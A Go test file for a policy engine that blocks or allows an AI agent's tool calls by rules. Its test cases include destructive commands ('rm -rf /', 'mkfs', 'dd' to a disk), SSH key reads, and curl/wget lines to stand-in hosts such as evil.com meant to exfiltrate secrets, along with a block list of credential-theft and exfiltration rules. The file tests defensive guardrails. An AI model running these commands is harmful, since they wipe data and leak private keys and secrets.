package engine

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/ctrlai/ctrlai/internal/extractor"
)

// helper to build a ToolCall with RawJSON populated from Arguments.
func tc(name string, args map[string]any) extractor.ToolCall {
	call := extractor.ToolCall{Name: name, Arguments: args}
	if args != nil {
		if data, err := json.Marshal(args); err == nil {
			call.RawJSON = data
		}
	}
	return call
}

// newDefaultEngine returns an engine with default builtins (no rules file).
func newDefaultEngine(t *testing.T) *Engine {
	t.Helper()
	e, err := New(filepath.Join(t.TempDir(), "nonexistent.yaml"))
	if err != nil {
		t.Fatalf("New() failed: %v", err)
	}
	return e
}

// --- matchesRule tests (via Evaluate) ---

func TestEvaluate_DefaultAllow(t *testing.T) {
	e := newDefaultEngine(t)
	d := e.Evaluate("agent1", tc("some_unknown_tool", nil))
	if d.Action != "allow" {
		t.Errorf("expected allow, got %q", d.Action)
	}
	if d.Rule != "" {
		t.Errorf("expected empty rule, got %q", d.Rule)
	}
}

func TestEvaluate_ToolNameCaseInsensitive(t *testing.T) {
	e := newDefaultEngine(t)

	// "exec" with SSH key access should be blocked regardless of case.
	tests := []struct {
		toolName string
	}{
		{"exec"},
		{"Exec"},
		{"EXEC"},
		{"ExEc"},
	}
	for _, tt := range tests {
		d := e.Evaluate("a", tc(tt.toolName, map[string]any{
			"command": "cat ~/.ssh/id_rsa",
		}))
		if d.Action != "block" {
			t.Errorf("tool=%q: expected block, got %q", tt.toolName, d.Action)
		}
	}
}

func TestEvaluate_ToolNameORLogic(t *testing.T) {
	e := newDefaultEngine(t)

	// block_ssh_private_keys matches tool: [exec, read]
	for _, tool := range []string{"exec", "read"} {
		d := e.Evaluate("a", tc(tool, map[string]any{
			"path": "/home/user/.ssh/id_rsa",
		}))
		if d.Action != "block" {
			t.Errorf("tool=%q: expected block for SSH key, got %q", tool, d.Action)
		}
	}

	// "write" is NOT in the tool list for block_ssh_private_keys.
	d := e.Evaluate("a", tc("write", map[string]any{
		"path": "/home/user/.ssh/id_rsa",
	}))
	// write + .ssh/id_ — not matched by block_ssh_private_keys (tool doesn't match)
	// but could match block_self_modification if .ctrlai/ is in args — let's check explicitly
	if d.Action == "block" && d.Rule == "block_ssh_private_keys" {
		t.Errorf("write tool should not match block_ssh_private_keys")
	}
}

func TestEvaluate_AgentExactMatch(t *testing.T) {
	e := newDefaultEngine(t)
	err := e.AddRule(`
name: block_agent_x
match:
  tool: exec
  agent: agent-x
action: block
message: blocked for agent-x
`)
	if err != nil {
		t.Fatal(err)
	}

	// agent-x should be blocked.
	d := e.Evaluate("agent-x", tc("exec", map[string]any{"command": "ls"}))
	if d.Action != "block" || d.Rule != "block_agent_x" {
		t.Errorf("agent-x: expected block by block_agent_x, got %+v", d)
	}

	// agent-y should be allowed (no match).
	d = e.Evaluate("agent-y", tc("exec", map[string]any{"command": "ls"}))
	if d.Rule == "block_agent_x" {
		t.Errorf("agent-y: should not match block_agent_x")
	}
}

func TestEvaluate_ActionMatch(t *testing.T) {
	e := newDefaultEngine(t)

	// block_camera matches tool=nodes, action=[camera_snap, camera_clip, camera_list]
	d := e.Evaluate("a", tc("nodes", map[string]any{"action": "camera_snap"}))
	if d.Action != "block" || d.Rule != "block_camera" {
		t.Errorf("camera_snap: expected block_camera, got %+v", d)
	}

	// Case-insensitive action matching.
	d = e.Evaluate("a", tc("nodes", map[string]any{"action": "Camera_Snap"}))
	if d.Action != "block" || d.Rule != "block_camera" {
		t.Errorf("Camera_Snap: expected block_camera, got %+v", d)
	}

	// Different action should not match camera rule.
	d = e.Evaluate("a", tc("nodes", map[string]any{"action": "something_else"}))
	if d.Rule == "block_camera" {
		t.Errorf("something_else should not match block_camera")
	}
}

func TestEvaluate_ArgContains(t *testing.T) {
	e := newDefaultEngine(t)

	// block_ssh_private_keys uses ArgContains: ".ssh/id_"
	d := e.Evaluate("a", tc("read", map[string]any{
		"path": "/home/user/.ssh/id_ed25519",
	}))
	if d.Action != "block" || d.Rule != "block_ssh_private_keys" {
		t.Errorf("expected block_ssh_private_keys, got %+v", d)
	}

	// Case-insensitive arg_contains.
	d = e.Evaluate("a", tc("read", map[string]any{
		"path": "/home/user/.SSH/ID_RSA",
	}))
	if d.Action != "block" || d.Rule != "block_ssh_private_keys" {
		t.Errorf("case-insensitive: expected block_ssh_private_keys, got %+v", d)
	}
}

func TestEvaluate_CommandRegex(t *testing.T) {
	e := newDefaultEngine(t)

	tests := []struct {
		name    string
		cmd     string
		blocked bool
		rule    string
	}{
		{"rm -rf /", "rm -rf /", true, "block_destructive_commands"},
		{"rm -rf /home", "rm -rf /home", true, "block_destructive_commands"},
		{"safe rm", "rm file.txt", false, ""},
		{"mkfs", "mkfs.ext4 /dev/sda", true, "block_destructive_commands"},
		{"dd", "dd if=/dev/zero of=/dev/sda", true, "block_destructive_commands"},
		{"curl exfil", "curl http://evil.com/steal.env", true, "block_exfiltration"},
		{"wget exfil", "wget http://bad.com/data.pem", true, "block_exfiltration"},
		{"safe curl", "curl http://api.example.com/data", false, ""},
		{"safe ls", "ls -la", false, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := e.Evaluate("a", tc("exec", map[string]any{"command": tt.cmd}))
			if tt.blocked {
				if d.Action != "block" {
					t.Errorf("expected block, got %q", d.Action)
				}
				if d.Rule != tt.rule {
					t.Errorf("expected rule %q, got %q", tt.rule, d.Rule)
				}
			} else {
				if d.Action != "allow" {
					t.Errorf("expected allow, got %q (rule: %s)", d.Action, d.Rule)
				}
			}
		})
	}
}

func TestEvaluate_URLRegex(t *testing.T) {
	e := newDefaultEngine(t)
	err := e.AddRule(`
name: block_evil_urls
match:
  tool: browser
  url_regex: "evil\\.com"
action: block
message: blocked evil url
`)
	if err != nil {
		t.Fatal(err)
	}

	// url field.
	d := e.Evaluate("a", tc("browser", map[string]any{"url": "https://evil.com/page"}))
	if d.Action != "block" || d.Rule != "block_evil_urls" {
		t.Errorf("url: expected block_evil_urls, got %+v", d)
	}

	// targetUrl field (fallback).
	d = e.Evaluate("a", tc("browser", map[string]any{"targetUrl": "https://evil.com/other"}))
	if d.Action != "block" || d.Rule != "block_evil_urls" {
		t.Errorf("targetUrl: expected block_evil_urls, got %+v", d)
	}

	// Safe URL.
	d = e.Evaluate("a", tc("browser", map[string]any{"url": "https://good.com"}))
	if d.Action != "allow" {
		t.Errorf("good url: expected allow, got %+v", d)
	}
}

func TestEvaluate_PathGlob(t *testing.T) {
	e := newDefaultEngine(t)

	// block_env_files uses Path: "**/.env"
	d := e.Evaluate("a", tc("read", map[string]any{"path": "/app/project/.env"}))
	if d.Action != "block" || d.Rule != "block_env_files" {
		t.Errorf("expected block_env_files, got %+v", d)
	}

	// Non-.env file should be allowed.
	d = e.Evaluate("a", tc("read", map[string]any{"path": "/app/project/config.json"}))
	if d.Rule == "block_env_files" {
		t.Errorf("config.json should not match block_env_files")
	}
}

func TestEvaluate_ANDLogicAcrossFields(t *testing.T) {
	e := newDefaultEngine(t)
	err := e.AddRule(`
name: strict_rule
match:
  tool: exec
  agent: prod-agent
  command_regex: "deploy"
action: block
message: no deploys in prod
`)
	if err != nil {
		t.Fatal(err)
	}

	// All conditions met → block.
	d := e.Evaluate("prod-agent", tc("exec", map[string]any{"command": "deploy --prod"}))
	if d.Action != "block" || d.Rule != "strict_rule" {
		t.Errorf("all match: expected strict_rule block, got %+v", d)
	}

	// Wrong agent → no match on this rule.
	d = e.Evaluate("dev-agent", tc("exec", map[string]any{"command": "deploy --prod"}))
	if d.Rule == "strict_rule" {
		t.Errorf("wrong agent should not match strict_rule")
	}

	// Wrong command → no match.
	d = e.Evaluate("prod-agent", tc("exec", map[string]any{"command": "ls"}))
	if d.Rule == "strict_rule" {
		t.Errorf("wrong command should not match strict_rule")
	}

	// Wrong tool → no match.
	d = e.Evaluate("prod-agent", tc("read", map[string]any{"command": "deploy"}))
	if d.Rule == "strict_rule" {
		t.Errorf("wrong tool should not match strict_rule")
	}
}

// --- Built-in rule tests ---

func TestBuiltinRules(t *testing.T) {
	e := newDefaultEngine(t)

	tests := []struct {
		name     string
		agent    string
		toolCall extractor.ToolCall
		wantRule string
		wantBlk  bool
	}{
		{
			name:     "ssh key read",
			toolCall: tc("read", map[string]any{"path": "/home/user/.ssh/id_rsa"}),
			wantRule: "block_ssh_private_keys",
			wantBlk:  true,
		},
		{
			name:     "shell config .bashrc",
			toolCall: tc("write", map[string]any{"path": "/home/user/.bashrc", "content": "export PATH=..."}),
			wantRule: "block_shell_config_write",
			wantBlk:  true,
		},
		{
			name:     "shell config .zshrc",
			toolCall: tc("edit", map[string]any{"path": "/home/user/.zshrc"}),
			wantRule: "block_shell_config_write_zsh",
			wantBlk:  true,
		},
		{
			name:     "shell config .profile",
			toolCall: tc("write", map[string]any{"path": "/home/user/.profile"}),
			wantRule: "block_shell_config_write_profile",
			wantBlk:  true,
		},
		{
			name:     "camera access",
			toolCall: tc("nodes", map[string]any{"action": "camera_snap"}),
			wantRule: "block_camera",
			wantBlk:  true,
		},
		{
			name:     "message admin kick",
			toolCall: tc("message", map[string]any{"action": "kick", "user": "someone"}),
			wantRule: "block_message_admin",
			wantBlk:  true,
		},
		{
			name:     "gateway modify",
			toolCall: tc("gateway", map[string]any{"action": "config.apply"}),
			wantRule: "block_gateway_modify",
			wantBlk:  true,
		},
		{
			name:     "self modification",
			toolCall: tc("write", map[string]any{"path": "/home/user/.ctrlai/rules.yaml"}),
			wantRule: "block_self_modification",
			wantBlk:  true,
		},
		{
			name:     "safe exec ls",
			toolCall: tc("exec", map[string]any{"command": "ls -la"}),
			wantBlk:  false,
		},
		{
			name:     "safe read normal file",
			toolCall: tc("read", map[string]any{"path": "/app/src/main.go"}),
			wantBlk:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			agent := tt.agent
			if agent == "" {
				agent = "test-agent"
			}
			d := e.Evaluate(agent, tt.toolCall)
			if tt.wantBlk {
				if d.Action != "block" {
					t.Errorf("expected block, got %q", d.Action)
				}
				if tt.wantRule != "" && d.Rule != tt.wantRule {
					t.Errorf("expected rule %q, got %q", tt.wantRule, d.Rule)
				}
			} else {
				if d.Action != "allow" {
					t.Errorf("expected allow, got %q (rule: %s)", d.Action, d.Rule)
				}
			}
		})
	}
}

// --- Builtin toggle test ---

func TestBuiltinToggle_Disabled(t *testing.T) {
	dir := t.TempDir()
	rulesPath := filepath.Join(dir, "rules.yaml")
	err := os.WriteFile(rulesPath, []byte(`rules: []
builtin:
  block_ssh_private_keys: false
  block_env_files: true
  block_credential_files: true
  block_shell_config_write: true
  block_shell_config_write_zsh: true
  block_shell_config_write_profile: true
  block_browser_passwords: true
  block_private_key_content: true
  block_system_files: true
  block_self_modification: true
  block_destructive_commands: true
  block_exfiltration: true
  block_camera: true
  block_screen_record: true
  block_location: true
  block_node_rce: true
  block_unsolicited_messages: false
  block_message_send: false
  block_message_admin: true
  block_sessions_spawn: false
  block_sessions_send: false
  block_memory_search: false
  block_memory_get: false
  block_cron_create: false
  block_gateway_modify: true
  block_gateway_restart: true
`), 0o644)
	if err != nil {
		t.Fatal(err)
	}

	e, err := New(rulesPath)
	if err != nil {
		t.Fatal(err)
	}

	// SSH key read should now be allowed since we toggled it off.
	d := e.Evaluate("a", tc("read", map[string]any{"path": "/home/user/.ssh/id_rsa"}))
	if d.Action != "allow" {
		t.Errorf("disabled SSH rule: expected allow, got %q (rule: %s)", d.Action, d.Rule)
	}

	// .env should still be blocked.
	d = e.Evaluate("a", tc("read", map[string]any{"path": "/app/.env"}))
	if d.Action != "block" || d.Rule != "block_env_files" {
		t.Errorf("env files should still be blocked: got %+v", d)
	}
}

// --- AddRule / RemoveRule tests ---

func TestAddRule(t *testing.T) {
	e := newDefaultEngine(t)
	before := e.CustomCount()

	err := e.AddRule(`
name: my_custom_rule
match:
  tool: exec
  arg_contains: "secret"
action: block
message: no secrets
`)
	if err != nil {
		t.Fatal(err)
	}

	if e.CustomCount() != before+1 {
		t.Errorf("expected custom count %d, got %d", before+1, e.CustomCount())
	}

	d := e.Evaluate("a", tc("exec", map[string]any{"command": "echo secret"}))
	if d.Action != "block" || d.Rule != "my_custom_rule" {
		t.Errorf("custom rule should match: got %+v", d)
	}
}

func TestAddRule_NoName(t *testing.T) {
	e := newDefaultEngine(t)
	err := e.AddRule(`
match:
  tool: exec
action: block
`)
	if err == nil {
		t.Error("expected error for rule without name")
	}
}

func TestAddRule_DefaultsToBlock(t *testing.T) {
	e := newDefaultEngine(t)
	err := e.AddRule(`
name: default_action_test
match:
  tool: some_tool
`)
	if err != nil {
		t.Fatal(err)
	}

	d := e.Evaluate("a", tc("some_tool", nil))
	if d.Action != "block" {
		t.Errorf("expected default action block, got %q", d.Action)
	}
}

func TestRemoveRule(t *testing.T) {
	e := newDefaultEngine(t)
	_ = e.AddRule(`
name: temp_rule
match:
  tool: exec
  arg_contains: "temptest"
action: block
`)

	// Verify it matches.
	d := e.Evaluate("a", tc("exec", map[string]any{"command": "temptest"}))
	if d.Rule != "temp_rule" {
		t.Fatalf("temp_rule should match, got %+v", d)
	}

	// Remove.
	err := e.RemoveRule("temp_rule")
	if err != nil {
		t.Fatal(err)
	}

	// Should no longer match.
	d = e.Evaluate("a", tc("exec", map[string]any{"command": "temptest"}))
	if d.Rule == "temp_rule" {
		t.Error("temp_rule should no longer match after removal")
	}
}

func TestRemoveRule_NotFound(t *testing.T) {
	e := newDefaultEngine(t)
	err := e.RemoveRule("nonexistent_rule")
	if err == nil {
		t.Error("expected error when removing nonexistent rule")
	}
}

// --- TestJSON ---

func TestTestJSON(t *testing.T) {
	e := newDefaultEngine(t)

	d, err := e.TestJSON(`{"name":"exec","arguments":{"command":"rm -rf /"}}`)
	if err != nil {
		t.Fatal(err)
	}
	if d.Action != "block" || d.Rule != "block_destructive_commands" {
		t.Errorf("expected block_destructive_commands, got %+v", d)
	}

	d, err = e.TestJSON(`{"name":"exec","arguments":{"command":"ls"}}`)
	if err != nil {
		t.Fatal(err)
	}
	if d.Action != "allow" {
		t.Errorf("expected allow for ls, got %+v", d)
	}
}

func TestTestJSON_Invalid(t *testing.T) {
	e := newDefaultEngine(t)
	_, err := e.TestJSON(`not valid json`)
	if err == nil {
		t.Error("expected error for invalid JSON")
	}
}

// --- Counts and ListRules ---

func TestEngineCountsAndList(t *testing.T) {
	e := newDefaultEngine(t)

	if e.TotalRules() == 0 {
		t.Error("expected non-zero total rules from defaults")
	}
	if e.BuiltinCount() == 0 {
		t.Error("expected non-zero builtin count")
	}
	if e.CustomCount() != 0 {
		t.Errorf("expected 0 custom rules, got %d", e.CustomCount())
	}
	if e.TotalRules() != e.BuiltinCount()+e.CustomCount() {
		t.Error("total should equal builtin + custom")
	}

	rules := e.ListRules()
	if len(rules) != e.TotalRules() {
		t.Errorf("ListRules len %d != TotalRules %d", len(rules), e.TotalRules())
	}
	for _, r := range rules {
		if r.Name == "" {
			t.Error("rule with empty name in ListRules")
		}
	}
}

// --- Save / Reload ---

func TestSaveAndReload(t *testing.T) {
	dir := t.TempDir()
	rulesPath := filepath.Join(dir, "rules.yaml")

	e, _ := New(filepath.Join(dir, "nonexistent.yaml"))
	_ = e.AddRule(`
name: persist_test
match:
  tool: exec
  arg_contains: "persist_check"
action: block
message: persistence test
`)

	err := e.Save(rulesPath)
	if err != nil {
		t.Fatal(err)
	}

	// Reload into a new engine.
	e2, err := New(rulesPath)
	if err != nil {
		t.Fatal(err)
	}

	d := e2.Evaluate("a", tc("exec", map[string]any{"command": "persist_check"}))
	if d.Action != "block" || d.Rule != "persist_test" {
		t.Errorf("reloaded engine should have persist_test rule: got %+v", d)
	}
}

// --- First-match-wins ordering ---

func TestFirstMatchWins(t *testing.T) {
	e := newDefaultEngine(t)

	// Add an allow rule for a specific agent to bypass SSH blocking.
	// Custom rules come AFTER builtins, so builtins still win by default.
	// But we can verify custom rules fire for things builtins don't cover.
	_ = e.AddRule(`
name: block_all_exec
match:
  tool: exec
action: block
message: all exec blocked
`)
	_ = e.AddRule(`
name: allow_ls
match:
  tool: exec
  command_regex: "^ls$"
action: allow
message: ls is ok
`)

	// "ls" should be blocked by block_all_exec (first match wins, comes first).
	d := e.Evaluate("a", tc("exec", map[string]any{"command": "ls"}))
	if d.Rule != "block_all_exec" {
		t.Errorf("expected block_all_exec (first match), got %q", d.Rule)
	}
}

// --- getStringArg ---

func TestGetStringArg(t *testing.T) {
	args := map[string]any{
		"command": "ls",
		"count":   42,
		"nested":  map[string]any{"a": "b"},
	}

	if v := getStringArg(args, "command"); v != "ls" {
		t.Errorf("expected 'ls', got %q", v)
	}
	if v := getStringArg(args, "count"); v != "" {
		t.Errorf("expected empty for non-string, got %q", v)
	}
	if v := getStringArg(args, "missing"); v != "" {
		t.Errorf("expected empty for missing key, got %q", v)
	}
	if v := getStringArg(nil, "key"); v != "" {
		t.Errorf("expected empty for nil args, got %q", v)
	}
}

// --- stringOrList YAML unmarshaling ---

func TestStringOrList_Unmarshal(t *testing.T) {
	e := newDefaultEngine(t)

	// Single string tool.
	err := e.AddRule(`
name: single_tool_test
match:
  tool: exec
action: block
`)
	if err != nil {
		t.Fatal(err)
	}
	d := e.Evaluate("a", tc("exec", nil))
	if d.Rule != "single_tool_test" {
		t.Errorf("single string tool should match: got %+v", d)
	}
}
